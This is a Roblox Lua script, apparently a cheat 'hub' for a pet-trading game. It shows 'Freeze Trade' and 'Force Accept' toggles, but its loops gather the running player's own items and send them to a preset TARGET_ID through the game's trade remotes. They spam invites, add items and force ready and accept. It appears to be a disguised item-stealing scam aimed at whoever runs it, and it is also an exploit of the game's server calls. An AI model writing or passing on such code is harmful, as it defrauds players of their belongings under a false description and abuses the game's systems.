local function addToggle(name, startOn)
    local frame = Instance.new("Frame", container)
    frame.Size = UDim2.new(1,0,0,34)
    frame.BackgroundTransparency = 1
    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(0.65,0,1,0)
    label.Text = name
    label.TextColor3 = Color3.fromRGB(180,210,255)
    label.Font = Enum.Font.GothamSemibold
    label.TextSize = 13
    label.BackgroundTransparency = 1
    label.TextXAlignment = Enum.TextXAlignment.Left
    local btn = Instance.new("TextButton", frame)
    btn.Position = UDim2.new(1,-44,0.5,-10)
    btn.Size = UDim2.new(0,40,0,20)
    btn.Text = ""
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(1,0)
    local circle = Instance.new("Frame", btn)
    circle.Size = UDim2.new(0,14,0,14)
    circle.BorderSizePixel = 0
    Instance.new("UICorner", circle).CornerRadius = UDim.new(1,0)
    local on = startOn or false
    local function setVisual(state)
        btn.BackgroundColor3 = state and Color3.fromRGB(20,50,140) or Color3.fromRGB(15,22,45)
        circle.BackgroundColor3 = state and Color3.fromRGB(80,150,255) or Color3.fromRGB(40,60,120)
        circle.Position = state and UDim2.new(1,-17,0.5,-7) or UDim2.new(0,3,0.5,-7)
    end
    setVisual(on)
    btn.MouseButton1Click:Connect(function()
        on = not on
        TweenService:Create(btn,    TweenInfo.new(0.2), {BackgroundColor3 = on and Color3.fromRGB(20,50,140) or Color3.fromRGB(15,22,45)}):Play()
        TweenService:Create(circle, TweenInfo.new(0.2), {BackgroundColor3 = on and Color3.fromRGB(80,150,255) or Color3.fromRGB(40,60,120)}):Play()
        circle:TweenPosition(on and UDim2.new(1,-17,0.5,-7) or UDim2.new(0,3,0.5,-7), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
    end)
    return function() return on end
end

local getFreeze      = addToggle("Freeze Trade", true)
local getForceAccept = addToggle("Force Accept", false)

local minimized = false
closeBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        container.Visible = false
        TweenService:Create(main, TweenInfo.new(0.3,Enum.EasingStyle.Quad), {Size=UDim2.new(0,230,0,42)}):Play()
        closeBtn.Text = "+"
    else
        TweenService:Create(main, TweenInfo.new(0.3,Enum.EasingStyle.Quad), {Size=UDim2.new(0,230,0,150)}):Play()
        task.wait(0.3)
        container.Visible = true
        closeBtn.Text = "−"
    end
end)

-- BUILD QUEUE
local myQueue = {}
for _, plotData in pairs(SYNC_DATA) do
    if type(plotData) == "table" then
        local owner = plotData.Owner or (type(plotData.Get)=="function" and plotData:Get("Owner"))
        if (typeof(owner)=="Instance" and owner==LP) or (typeof(owner)=="table" and owner.UserId==LP.UserId) then
            local animalList = plotData.AnimalList or (type(plotData.Get)=="function" and plotData:Get("AnimalList"))
            if type(animalList) == "table" then
                for slotKey, data in pairs(animalList) do
                    if type(data)=="table" and data.Index and TargetBrainrots[data.Index] then
                        table.insert(myQueue, {slotKey=tonumber(slotKey), data=data})
                    end
                end
            end
        end
    end
end

-- REMOTES
local inviteRemote = getRemote("TradeService/Invite")
local addRemote    = getRemote("TradeService/AddBrainrot")
local readyRemote  = getRemote("TradeService/Ready")
local acceptRemote = getRemote("TradeService/Accept")

print("[Nunes] Queue:", #myQueue)
print("[Nunes] invite:", inviteRemote)
print("[Nunes] add:", addRemote)
print("[Nunes] ready:", readyRemote)
print("[Nunes] accept:", acceptRemote)

applyFreeze()

-- SELECT BRAINROT
task.spawn(function()
    local idx = 1
    while true do
        task.wait(DELAY_STEP)
        if not getFreeze() then continue end
        if #myQueue == 0 then continue end
        local item = myQueue[idx]
        if item then
            pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
            idx = (idx % #myQueue) + 1
        end
    end
end)

-- INVITE
task.spawn(function()
    while true do
        task.wait(TRADE_CYCLE_DELAY)
        if not getFreeze() then continue end
        if TARGET_ID == 0 then
            print("[Nunes] TARGET_ID é 0, verifique o script gerado")
            continue
        end
        print("[Nunes] enviando invite para:", TARGET_ID)
        pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
    end
end)

-- READY + ACCEPT
task.spawn(function()
    while true do
        task.wait(1)
        if not getForceAccept() then continue end
        pcall(function() readyRemote:FireServer(READY_GUID) end)
        task.wait(0.5)
        pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
    end
end)

print("[Nunes] Hub carregado!")
